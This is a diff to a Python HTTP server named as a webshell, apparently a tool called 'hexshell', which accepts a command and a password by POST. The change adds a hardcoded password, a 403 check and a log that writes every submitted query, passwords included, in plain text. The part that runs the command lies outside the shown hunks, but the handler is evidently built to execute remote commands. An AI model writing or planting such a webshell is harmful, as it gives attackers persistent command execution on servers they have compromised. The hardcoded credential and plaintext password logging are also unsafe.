@@ -3,6 +3,9 @@ import urllib.parse
 import subprocess
 import platform
 import requests
+import json
+
+PASSWORD = "83X58311"
 
 print("""
  __   __  _______  __   __  _______  __   __  _______  ___      ___     
@@ -43,17 +46,21 @@ class Webshell(BaseHTTPRequestHandler):
     def do_POST(self):
         content_length = int(self.headers['Content-Length'])
         post_data = self.rfile.read(content_length).decode()
-        print(post_data)
         query = urllib.parse.parse_qs(post_data)
-        print(query)
         if not "cmd" in query or not "pw" in query:
             self.send_response(400)
             self.send_header('Content-type', 'text/html')
             self.end_headers()
             self.wfile.write(b'Please specify the command and the password')
             return
-        cmd = query["cmd"]
-        print(cmd)
+        with open("hexshell.access.log", "a+") as f:
+            f.write(str(query["pw"] == PASSWORD)+" "+json.dumps(query))
+        if query["pw"] != PASSWORD:
+            self.send_response(403)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            self.wfile.write(b'403 Forbidden')
+            return
         self.send_response(200)
         self.send_header('Content-type', 'text/html')
         self.end_headers()
